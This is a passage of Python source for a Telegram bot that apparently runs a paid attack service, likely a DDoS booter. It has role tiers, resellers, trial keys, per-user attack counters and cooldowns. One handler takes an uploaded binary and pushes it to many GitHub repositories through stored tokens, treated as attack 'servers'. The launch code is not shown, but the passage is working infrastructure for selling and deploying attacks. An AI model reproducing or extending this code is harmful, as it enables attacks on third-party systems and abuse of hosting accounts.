            monitor_thread.daemon = True
            monitor_thread.start()
            
            context.user_data.clear()
    
    elif waiting_for == 'cooldown':
        if not is_owner(user_id) and not is_admin(user_id):
            return
        
        try:
            cooldown = int(text)
            if cooldown < 0:
                raise ValueError
            
            COOLDOWN_DURATION = cooldown
            save_json('cooldown.json', {"cooldown": cooldown})
            
            await update.message.reply_text(f"✅ COOLDOWN SET\n\nNew cooldown: {cooldown}s")
        except:
            await update.message.reply_text("❌ Invalid number")
        
        context.user_data.clear()
    
    elif waiting_for == 'max_attacks':
        if not is_owner(user_id) and not is_admin(user_id):
            return
        
        try:
            max_attacks = int(text)
            if max_attacks < 1:
                raise ValueError
            
            MAX_ATTACKS = max_attacks
            save_json('max_attacks.json', {"max_attacks": max_attacks})
            
            await update.message.reply_text(f"✅ MAX ATTACKS SET\n\nNew limit: {max_attacks}")
        except:
            await update.message.reply_text("❌ Invalid number")
        
        context.user_data.clear()
    
    elif waiting_for == 'trial_hours':
        if not is_owner(user_id) and not is_admin(user_id):
            return
        
        try:
            hours = int(text)
            if hours < 1:
                raise ValueError
            
            key = generate_trial_key(hours)
            await update.message.reply_text(f"✅ TRIAL KEY GENERATED\n\nKey: {key}\nDuration: {hours}h\n\nShare with users")
        except:
            await update.message.reply_text("❌ Invalid number")
        
        context.user_data.clear()
    
    elif waiting_for == 'broadcast':
        if not is_owner(user_id) and not is_admin(user_id):
            return
        
        sent = 0
        failed = 0
        
        for uid in approved_users.keys():
            try:
                await context.bot.send_message(chat_id=int(uid), text=f"📢 BROADCAST\n\n{text}")
                sent += 1
            except:
                failed += 1
        
        await update.message.reply_text(f"✅ BROADCAST SENT\n\nSent: {sent}\nFailed: {failed}")
        context.user_data.clear()
    
    elif waiting_for == 'add_token':
        if not is_owner(user_id):
            return
        
        try:
            parts = text.split(':')
            if len(parts) != 3:
                raise ValueError
            
            username, token, repo = parts
            g = Github(token)
            repo_obj = g.get_repo(f"{username}/{repo}")
            
            new_token = {
                "username": username,
                "token": token,
                "repo": f"{username}/{repo}"
            }
            
            github_tokens.append(new_token)
            save_json('github_tokens.json', github_tokens)
            
            await update.message.reply_text(f"✅ TOKEN ADDED\n\nRepo: {username}/{repo}\nTotal: {len(github_tokens)}")
        except:
            await update.message.reply_text("❌ ERROR\n\nCheck format or token")
        
        context.user_data.clear()
    
    elif waiting_for == 'remove_token':
        if not is_owner(user_id):
            return
        
        try:
            num = int(text)
            if num < 1 or num > len(github_tokens):
                raise ValueError
            
            removed = github_tokens.pop(num - 1)
            save_json('github_tokens.json', github_tokens)
            
            await update.message.reply_text(f"✅ TOKEN REMOVED\n\nRepo: {removed['repo']}\nRemaining: {len(github_tokens)}")
        except:
            await update.message.reply_text("❌ Invalid number")
        
        context.user_data.clear()
    
    elif waiting_for == 'add_owner':
        if not is_owner(user_id):
            return
        
        try:
            target_id = int(text)
            
            owners[str(target_id)] = {
                "username": f"owner_{target_id}",
                "added_by": user_id,
                "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
                "is_primary": False
            }
            save_json('owners.json', owners)
            
            await update.message.reply_text(f"✅ OWNER ADDED\n\nID: {target_id}")
        except:
            await update.message.reply_text("❌ Invalid ID")
        
        context.user_data.clear()
    
    elif waiting_for == 'remove_owner':
        if not is_owner(user_id):
            return
        
        try:
            target_id = text.strip()
            
            if target_id in owners:
                if owners[target_id].get('is_primary', False):
                    await update.message.reply_text("❌ Cannot remove primary owner")
                else:
                    del owners[target_id]
                    save_json('owners.json', owners)
                    await update.message.reply_text(f"✅ OWNER REMOVED\n\nID: {target_id}")
            else:
                await update.message.reply_text("❌ Owner not found")
        except:
            await update.message.reply_text("❌ Error")
        
        context.user_data.clear()
    
    elif waiting_for == 'add_admin':
        if not is_owner(user_id):
            return
        
        try:
            target_id = int(text)
            
            admins[str(target_id)] = {
                "username": f"admin_{target_id}",
                "added_by": user_id,
                "added_date": time.strftime("%Y-%m-%d %H:%M:%S")
            }
            save_json('admins.json', admins)
            
            await update.message.reply_text(f"✅ ADMIN ADDED\n\nID: {target_id}")
        except:
            await update.message.reply_text("❌ Invalid ID")
        
        context.user_data.clear()
    
    elif waiting_for == 'remove_admin':
        if not is_owner(user_id):
            return
        
        try:
            target_id = text.strip()
            
            if target_id in admins:
                del admins[target_id]
                save_json('admins.json', admins)
                await update.message.reply_text(f"✅ ADMIN REMOVED\n\nID: {target_id}")
            else:
                await update.message.reply_text("❌ Admin not found")
        except:
            await update.message.reply_text("❌ Error")
        
        context.user_data.clear()
    
    elif waiting_for == 'add_reseller':
        if not is_owner(user_id):
            return
        
        try:
            target_id = int(text)
            
            resellers[str(target_id)] = {
                "username": f"reseller_{target_id}",
                "added_by": user_id,
                "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
                "expiry": "LIFETIME"
            }
            save_json('resellers.json', resellers)
            
            await update.message.reply_text(f"✅ RESELLER ADDED\n\nID: {target_id}")
        except:
            await update.message.reply_text("❌ Invalid ID")
        
        context.user_data.clear()
    
    elif waiting_for == 'remove_reseller':
        if not is_owner(user_id):
            return
        
        try:
            target_id = text.strip()
            
            if target_id in resellers:
                del resellers[target_id]
                save_json('resellers.json', resellers)
                await update.message.reply_text(f"✅ RESELLER REMOVED\n\nID: {target_id}")
            else:
                await update.message.reply_text("❌ Reseller not found")
        except:
            await update.message.reply_text("❌ Error")
        
        context.user_data.clear()

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_owner(user_id):
        await update.message.reply_text("❌ Access denied")
        return
    
    if context.user_data.get('waiting_for') != 'binary':
        return
    
    context.user_data.clear()
    
    if not update.message.document:
        await update.message.reply_text("❌ Please send a file")
        return
    
    progress = await update.message.reply_text("📥 DOWNLOADING...")
    
    try:
        file = await update.message.document.get_file()
        file_path = f"temp_binary_{user_id}.bin"
        await file.download_to_drive(file_path)
        
        with open(file_path, 'rb') as f:
            binary_content = f.read()
        
        file_size = len(binary_content)
        await progress.edit_text(f"📊 Downloaded: {file_size} bytes\n📤 Uploading...")
        
        success = 0
        fail = 0
        results = []
        
        def upload_to_repo(token_data):
            try:
                g = Github(token_data['token'])
                repo = g.get_repo(token_data['repo'])
                try:
                    existing = repo.get_contents(BINARY_FILE_NAME)
                    repo.update_file(BINARY_FILE_NAME, "Update binary", binary_content, existing.sha, branch="main")
                    results.append(True)
                except:
                    repo.create_file(BINARY_FILE_NAME, "Upload binary", binary_content, branch="main")
                    results.append(True)
            except:
                results.append(False)
        
        threads = []
        for token_data in github_tokens:
            thread = threading.Thread(target=upload_to_repo, args=(token_data,))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        success = sum(results)
        fail = len(results) - success
        
        os.remove(file_path)
        
        text = f"✅ UPLOAD COMPLETE\n\n✅ Success: {success}\n❌ Failed: {fail}\n📊 Total: {len(github_tokens)}\n📁 File: {BINARY_FILE_NAME}\n📦 Size: {file_size} bytes"
        await progress.edit_text(text)
    except Exception as e:
        await progress.edit_text(f"❌ ERROR\n\n{str(e)}")

async def id_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "None"
    text = f"🆔 YOUR ID\n\n🆔 User ID: {user_id}\n👤 Username: @{username}\n\n💡 Send this ID to admin"
    await update.message.reply_text(text)

async def myaccess_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_owner(user_id):
        role = "👑 OWNER"
        expiry = "LIFETIME"
    elif is_admin(user_id):
        role = "⚡ ADMIN"
        expiry = "LIFETIME"
    elif is_reseller(user_id):
        role = "💎 RESELLER"
        expiry = "LIFETIME"
    elif is_approved_user(user_id):
        role = "✨ USER"
        user_data = approved_users.get(str(user_id), {})
        exp = user_data.get('expiry', 0)
        if exp == "LIFETIME":
            expiry = "LIFETIME"
        else:
            days_left = int((exp - time.time()) / 86400)
            hours_left = int(((exp - time.time()) % 86400) / 3600)
            expiry = f"{days_left}d {hours_left}h"
    else:
        role = "⏳ PENDING"
        expiry = "WAITING"
    
    remaining = MAX_ATTACKS - user_attack_counts.get(str(user_id), 0)
    text = f"🔐 YOUR ACCESS\n\n👤 Role: {role}\n🆔 ID: {user_id}\n👤 Username: @{update.effective_user.username or 'None'}\n📅 Expiry: {expiry}\n🎯 Attacks: {remaining}/{MAX_ATTACKS}\n✅ Status: {'Active' if can_user_attack(user_id) else 'Inactive'}"
    await update.message.reply_text(text)

async def add_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text("❌ Access denied")
        return
    
    if len(context.args) < 2:
        await update.message.reply_text("❌ Usage: /add <id> <days>")
        return
    
    try:
        target_id = int(context.args[0])
        days = int(context.args[1])
        
        pending_users[:] = [u for u in pending_users if str(u['user_id']) != str(target_id)]
        save_json('pending_users.json', pending_users)
        
        if days == 0:
            expiry = "LIFETIME"
        else:
            expiry = time.time() + (days * 86400)
        
        approved_users[str(target_id)] = {
            "username": f"user_{target_id}",
            "added_by": user_id,
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "expiry": expiry,
            "days": days
        }
        save_json('approved_users.json', approved_users)
        
        try:
            await context.bot.send_message(chat_id=target_id, text=f"✅ ACCESS APPROVED\n\n🎉 Access granted for {days} days\n💡 Use /start")
        except:
            pass
        
        await update.message.reply_text(f"✅ USER ADDED\n\n🆔 ID: {target_id}\n⏱️ Days: {days}\n👤 By: {user_id}")
    except:
        await update.message.reply_text("❌ Invalid format")

async def remove_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text("❌ Access denied")
        return
    
    if len(context.args) < 1:
        await update.message.reply_text("❌ Usage: /remove <id>")
        return
    
    try:
        target_id = str(context.args[0])
        
        if target_id in approved_users:
            del approved_users[target_id]
            save_json('approved_users.json', approved_users)
            await update.message.reply_text(f"✅ USER REMOVED\n\nID: {target_id}")
        else:
            await update.message.reply_text("❌ User not found")
    except:
        await update.message.reply_text("❌ Error")

async def redeem_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if len(context.args) != 1:
        await update.message.reply_text("❌ Usage: /redeem <key>")
        return
    
    key = context.args[0].upper()
    success, message = redeem_trial_key(key, user_id)
    
    if success:
        await update.message.reply_text(f"✅ TRIAL ACTIVATED\n\n{message}\n\nUse /start")
    else:
        await update.message.reply_text(f"❌ FAILED\n\n{message}")

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if is_owner(user_id) or is_admin(user_id):
        text = "ℹ️ HELP - COMMANDS\n\nFOR ALL USERS:\n/start - Main menu\n/id - Get your ID\n/myaccess - Check access\n/help - Show help\n/redeem <key> - Redeem trial\n\nADMIN COMMANDS:\n/add <id> <days> - Add user\n/remove <id> - Remove user\n\nUse buttons for other features"
    else:
        text = "ℹ️ HELP - COMMANDS\n\n/start - Main menu\n/id - Get your ID\n/myaccess - Check access\n/help - Show help\n/redeem <key> - Redeem trial\n\nContact admin for access"
    
    await update.message.reply_text(text)

def main():
    application = Application.builder().token(BOT_TOKEN).build()
    
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("id", id_cmd))
    application.add_handler(CommandHandler("myaccess", myaccess_cmd))
    application.add_handler(CommandHandler("add", add_cmd))
    application.add_handler(CommandHandler("remove", remove_cmd))
    application.add_handler(CommandHandler("redeem", redeem_cmd))
    application.add_handler(CommandHandler("help", help_cmd))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    
    print("🤖 BOT IS RUNNING...")
    print(f"👑 Owners: {len(owners)}")
    print(f"⚡ Admins: {len(admins)}")
    print(f"📊 Users: {len(approved_users)}")
    print(f"💎 Resellers: {len(resellers)}")
    print(f"🔑 Servers: {len(github_tokens)}")
    print(f"🔧 Maintenance: {'ON' if MAINTENANCE_MODE else 'OFF'}")
    print(f"⏳ Cooldown: {COOLDOWN_DURATION}s")
    print(f"🎯 Max attacks: {MAX_ATTACKS}")
    
    application.run_polling()

if __name__ == '__main__':
    main()
